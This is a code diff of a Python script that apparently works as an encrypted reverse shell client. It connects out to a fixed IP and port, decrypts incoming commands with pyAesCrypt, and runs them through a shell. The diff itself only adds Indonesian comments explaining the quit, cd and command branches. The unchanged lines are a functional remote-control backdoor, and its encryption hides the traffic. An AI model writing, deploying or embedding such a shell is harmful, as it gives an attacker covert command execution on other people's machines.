@@ -1,11 +1,11 @@
 #!/usr/bin/python
 import subprocess,socket,os
-import pyAesCrypt
 import sys
 import io
+import pyAesCrypt
 
 #Masukan IP dan Port
-HOST = '192.168.1.5'
+HOST = '192.168.1.5' #Ini adalah Ip pribadi pemilik server
 PORT = 4420
 
 #Konfigurasi socket connection
@@ -46,14 +46,16 @@ while 1:
 	data = s.recv(1024)
 	decrypted = decryptData(data)
 	print(decrypted)
-	
+	#Apabila command "quit" maka program akan berhenti
 	if decrypted == "quit":
 		print('\nQuitting...')
 		break
+	#Apabila command "cd" maka akan diganti direktori selama valid
 	elif decrypted[:2] == "cd":
 		try: os.chdir(decrypted[3:])
 		except:	pass
 		s.sendall(encryptData('EOFX'))
+	#Selain dari itu akan dijalankan proses normal
 	else:
 		proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		stdoutput = proc.stdout.read() + proc.stderr.read()
